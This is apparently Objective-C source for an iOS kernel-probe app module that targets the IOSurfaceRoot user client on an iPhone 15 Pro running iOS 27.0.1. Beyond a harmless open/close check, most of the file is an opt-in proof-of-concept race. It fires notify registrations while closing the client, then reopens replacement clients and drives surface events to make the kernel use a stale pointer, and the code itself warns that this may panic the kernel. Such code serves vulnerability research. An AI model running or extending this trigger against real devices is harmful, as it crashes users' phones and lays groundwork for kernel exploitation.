#import "KPIOSurfaceProbeModule.h"

#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#ifndef KP_IOSURFACE27_ENABLE_RACE
#define KP_IOSURFACE27_ENABLE_RACE 0
#endif

#define KP_IOSURFACE_SELECTOR_RELEASE 1
#define KP_IOSURFACE_SELECTOR_CREATE_FAST 6
#define KP_IOSURFACE_SELECTOR_SET_USE_COUNT 15
#define KP_IOSURFACE_SELECTOR_NOTIFY_ADD 17
#define KP_IOSURFACE_LOCK_RESULT_SIZE 0xc68
#define KP_IOSURFACE_NOT_READY ((kern_return_t)0xe00002d8)

@interface KPIOSurfaceProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixelFormat;
    uint32_t bytesPerElement;
    uint32_t bytesPerRow;
    uint32_t allocSize;
} KPIOSurfaceFastCreateArgs;

static kern_return_t KPIOSurfaceOpen(io_connect_t *connection) {
    if (!connection) {
        return KERN_INVALID_ARGUMENT;
    }
    *connection = IO_OBJECT_NULL;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOSurfaceRoot"));
    if (!service) {
        return kIOReturnNoDevice;
    }
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, connection);
    IOObjectRelease(service);
    return kr;
}

#if KP_IOSURFACE27_ENABLE_RACE

static kern_return_t KPIOSurfaceCreateFast(io_connect_t connection, uint32_t *surfaceID) {
    KPIOSurfaceFastCreateArgs args;
    memset(&args, 0, sizeof(args));
    args.width = 64;
    args.height = 64;
    args.pixelFormat = 0x42475241;
    args.bytesPerElement = 4;
    args.bytesPerRow = 64 * 4;
    args.allocSize = 0x4000;

    uint8_t result[KP_IOSURFACE_LOCK_RESULT_SIZE];
    memset(result, 0, sizeof(result));
    size_t resultSize = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(connection,
                                           KP_IOSURFACE_SELECTOR_CREATE_FAST,
                                           NULL, 0,
                                           &args, sizeof(args),
                                           NULL, NULL,
                                           result, &resultSize);
    if (kr == KERN_SUCCESS && resultSize >= 0x1c) {
        memcpy(surfaceID, result + 0x18, sizeof(*surfaceID));
        if (*surfaceID == 0) {
            return kIOReturnError;
        }
    } else if (kr == KERN_SUCCESS) {
        return kIOReturnUnderrun;
    }
    return kr;
}

static kern_return_t KPIOSurfaceReleaseID(io_connect_t connection, uint32_t surfaceID) {
    uint64_t input = surfaceID;
    return IOConnectCallMethod(connection, KP_IOSURFACE_SELECTOR_RELEASE,
                               &input, 1, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

static kern_return_t KPIOSurfaceSetUseCount(io_connect_t connection,
                                             uint32_t surfaceID,
                                             uint64_t direction) {
    uint64_t input[2] = {surfaceID, direction};
    return IOConnectCallMethod(connection, KP_IOSURFACE_SELECTOR_SET_USE_COUNT,
                               input, 2, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

typedef struct {
    io_connect_t connection;
    mach_port_t wakePort;
    const uint32_t *surfaceIDs;
    uint32_t surfaceIDCount;
    atomic_int stop;
    atomic_int closeIssued;
    atomic_int closeFinished;
    atomic_int lastKR;
    atomic_uint attempts;
    atomic_uint successes;
    atomic_uint notReady;
    atomic_uint lateSuccess;
    atomic_uint lateNotReady;
} KPIOSurfaceRaceContext;

static void *KPIOSurfaceRegistrationThread(void *argument) {
    KPIOSurfaceRaceContext *context = argument;
    for (uint32_t index = 0; index < context->surfaceIDCount; index++) {
        if (atomic_load_explicit(&context->stop, memory_order_acquire)) {
            break;
        }
        uint64_t input[3] = {0, context->surfaceIDs[index], 0};
        uint64_t reference = 0x4b50000000000000ULL | index;
        kern_return_t kr = IOConnectCallAsyncStructMethod(context->connection,
                                                           KP_IOSURFACE_SELECTOR_NOTIFY_ADD,
                                                           context->wakePort,
                                                           &reference, 1,
                                                           input, sizeof(input),
                                                           NULL, NULL);
        atomic_store_explicit(&context->lastKR, kr, memory_order_release);
        atomic_fetch_add_explicit(&context->attempts, 1, memory_order_relaxed);
        BOOL afterClose = atomic_load_explicit(&context->closeFinished,
                                               memory_order_acquire) != 0;
        if (kr == KERN_SUCCESS) {
            atomic_fetch_add_explicit(&context->successes, 1, memory_order_relaxed);
            if (afterClose) {
                atomic_fetch_add_explicit(&context->lateSuccess, 1, memory_order_relaxed);
            }
        } else if (kr == KP_IOSURFACE_NOT_READY) {
            atomic_fetch_add_explicit(&context->notReady, 1, memory_order_relaxed);
            if (afterClose) {
                atomic_fetch_add_explicit(&context->lateNotReady, 1, memory_order_relaxed);
            }
        }
    }
    return NULL;
}

static void KPIOSurfaceReleaseWakePort(mach_port_t wakePort) {
    if (wakePort == MACH_PORT_NULL) {
        return;
    }
    mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_SEND, -1);
    mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_RECEIVE, -1);
}

static BOOL KPIOSurfaceCreateWakePort(mach_port_t *port) {
    mach_port_t wakePort = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);
    if (kr != KERN_SUCCESS) {
        return NO;
    }
    kr = mach_port_insert_right(mach_task_self(), wakePort, wakePort, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_mod_refs(mach_task_self(), wakePort, MACH_PORT_RIGHT_RECEIVE, -1);
        return NO;
    }
    *port = wakePort;
    return YES;
}

static void KPIOSurfaceDriveEvents(NSMutableString *report) {
    io_connect_t helper = IO_OBJECT_NULL;
    kern_return_t kr = KPIOSurfaceOpen(&helper);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"    event helper open failed: 0x%08x\n", (uint32_t)kr];
        return;
    }

    for (uint32_t index = 0; index < 16; index++) {
        uint32_t surfaceID = 0;
        kr = KPIOSurfaceCreateFast(helper, &surfaceID);
        if (kr != KERN_SUCCESS) {
            [report appendFormat:@"    event create[%u] failed: 0x%08x\n",
             index, (uint32_t)kr];
            break;
        }
        kern_return_t useKR1 = KPIOSurfaceSetUseCount(helper, surfaceID, 1);
        kern_return_t useKR0 = KPIOSurfaceSetUseCount(helper, surfaceID, 0);
        kern_return_t releaseKR = KPIOSurfaceReleaseID(helper, surfaceID);
        if (index == 0) {
            [report appendFormat:@"    event use(1)=0x%08x use(0)=0x%08x release=0x%08x\n",
             (uint32_t)useKR1, (uint32_t)useKR0, (uint32_t)releaseKR];
        }
    }
    IOServiceClose(helper);
}

static NSString *KPIOSurfaceRunRace(NSMutableString *report) {
    enum { rounds = 24, surfacesPerRound = 64, replacementCount = 4 };
    [report appendString:@"\n=== IOSurface 27 notify/stop race (EXPLICIT OPT-IN) ===\n"];
    [report appendString:@"Target schedule: selector 17 inserts after stop()->purge, then surface events dereference stale UC.\n"];
    [report appendString:@"A kernel panic is possible. No KRW and no cross-type heap spray are used.\n"];

    uint32_t surfaceIDs[surfacesPerRound];
    for (uint32_t round = 0; round < rounds; round++) {
        io_connect_t victim = IO_OBJECT_NULL;
        mach_port_t wakePort = MACH_PORT_NULL;
        pthread_t thread;
        BOOL threadStarted = NO;
        KPIOSurfaceRaceContext context;
        memset(&context, 0, sizeof(context));
        uint32_t created = 0;
        kern_return_t kr = KPIOSurfaceOpen(&victim);
        if (kr != KERN_SUCCESS) {
            [report appendFormat:@"  round %02u: victim open failed 0x%08x\n",
             round, (uint32_t)kr];
            break;
        }
        if (!KPIOSurfaceCreateWakePort(&wakePort)) {
            [report appendFormat:@"  round %02u: wake-port creation failed\n", round];
            IOServiceClose(victim);
            continue;
        }
        while (created < surfacesPerRound) {
            kr = KPIOSurfaceCreateFast(victim, &surfaceIDs[created]);
            if (kr != KERN_SUCCESS) {
                break;
            }
            created++;
        }
        if (created < surfacesPerRound) {
            [report appendFormat:@"  round %02u: only %u/%u surfaces, create kr=0x%08x\n",
             round, created, surfacesPerRound, (uint32_t)kr];
            KPIOSurfaceReleaseWakePort(wakePort);
            IOServiceClose(victim);
            continue;
        }

        context.connection = victim;
        context.wakePort = wakePort;
        context.surfaceIDs = surfaceIDs;
        context.surfaceIDCount = created;
        int threadKR = pthread_create(&thread, NULL, KPIOSurfaceRegistrationThread, &context);
        if (threadKR == 0) {
            threadStarted = YES;
            for (uint32_t spin = 0; spin < 1024; spin++) {
                if (atomic_load_explicit(&context.attempts, memory_order_acquire) != 0) {
                    break;
                }
                sched_yield();
            }
            atomic_store_explicit(&context.closeIssued, 1, memory_order_release);
            kern_return_t closeKR = IOServiceClose(victim);
            atomic_store_explicit(&context.closeFinished, 1, memory_order_release);
            atomic_store_explicit(&context.stop, 1, memory_order_release);
            pthread_join(thread, NULL);

            io_connect_t replacements[replacementCount] = {IO_OBJECT_NULL};
            uint32_t replacementsOpened = 0;
            for (; replacementsOpened < replacementCount; replacementsOpened++) {
                kr = KPIOSurfaceOpen(&replacements[replacementsOpened]);
                if (kr != KERN_SUCCESS) {
                    break;
                }
            }

            [report appendFormat:
             @"  round %02u: close=0x%08x attempts=%u success=%u notReady=%u "
             @"lateSuccess=%u lateNotReady=%u lastKR=0x%08x replacements=%u\n",
             round, (uint32_t)closeKR,
             atomic_load_explicit(&context.attempts, memory_order_relaxed),
             atomic_load_explicit(&context.successes, memory_order_relaxed),
             atomic_load_explicit(&context.notReady, memory_order_relaxed),
             atomic_load_explicit(&context.lateSuccess, memory_order_relaxed),
             atomic_load_explicit(&context.lateNotReady, memory_order_relaxed),
             (uint32_t)atomic_load_explicit(&context.lastKR, memory_order_relaxed),
             replacementsOpened];

            KPIOSurfaceDriveEvents(report);
            for (uint32_t index = 0; index < replacementsOpened; index++) {
                IOServiceClose(replacements[index]);
            }
        } else {
            [report appendFormat:@"  round %02u: pthread_create failed %d\n", round, threadKR];
        }

        if (!threadStarted) {
            atomic_store_explicit(&context.stop, 1, memory_order_release);
            IOServiceClose(victim);
        }
        KPIOSurfaceReleaseWakePort(wakePort);
    }

    [report appendString:@"Interpretation: lateSuccess after close is compatible with a surviving stale node; lateNotReady=0xe00002d8 is the 27.2 guard. A clean run does not disprove the race.\n"];
    return report;
}

static BOOL KPIOSurfaceRaceRequested(void) {
    if ([NSUserDefaults.standardUserDefaults boolForKey:@"KexProofIOSurfaceRaceEnabled"]) {
        return YES;
    }
    NSString *value = NSProcessInfo.processInfo.environment[@"KEXPROOF_IOSURFACE27_RACE"];
    return [value isEqualToString:@"YES"];
}
#endif

@implementation KPIOSurfaceProbeModule

- (instancetype)init {
    self = [super init];
    if (self) {
        _identifier = @"iosurface.probe";
        _title = @"IOSurface 27 Probe";
        _subtitle = @"Open/start/stop reachability; notify/stop race is double opt-in";
        _icon = @"rectangle.on.rectangle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV3 IOSurface 27 probe ===\n"];
    [report appendString:@"Target: iPhone16,1 (iPhone 15 Pro) / A17 Pro, iOS 27.0.1\n"];
    [report appendString:@"Candidate: IOSurfaceNotifyRequest survives UC stop and later uses stale UC pointer.\n"];
    [report appendString:@"27.2 control: UC+0xf1 stopping flag and kIOReturnNotReady (0xe00002d8).\n"];

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = KPIOSurfaceOpen(&connection);
    [report appendFormat:@"IOServiceOpen (open/start), type=0: kr=0x%08x connection=%u\n",
     (uint32_t)kr, connection];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"Verdict: user-client reachability failed in this runtime profile.\n"];
        return report;
    }
    kern_return_t closeKR = IOServiceClose(connection);
    [report appendFormat:@"IOServiceClose (stop): kr=0x%08x\n", (uint32_t)closeKR];
    if (closeKR != KERN_SUCCESS) {
        [report appendString:@"Verdict: open/start succeeded, but stop did not complete cleanly.\n"];
        return report;
    }
    [report appendString:@"Baseline: open/start/stop succeeded; no selector was called and no surface was created.\n"];

#if KP_IOSURFACE27_ENABLE_RACE
    if (KPIOSurfaceRaceRequested()) {
        return KPIOSurfaceRunRace(report);
    }
    [report appendString:@"Race: built in, but disabled at runtime (enable the IOSurface race switch or set KEXPROOF_IOSURFACE27_RACE=YES).\n"];
#else
    [report appendString:@"Race: NOT COMPILED (requires KP_IOSURFACE27_ENABLE_RACE=1 at build and KEXPROOF_IOSURFACE27_RACE=YES at runtime).\n"];
#endif
    return report;
}

@end
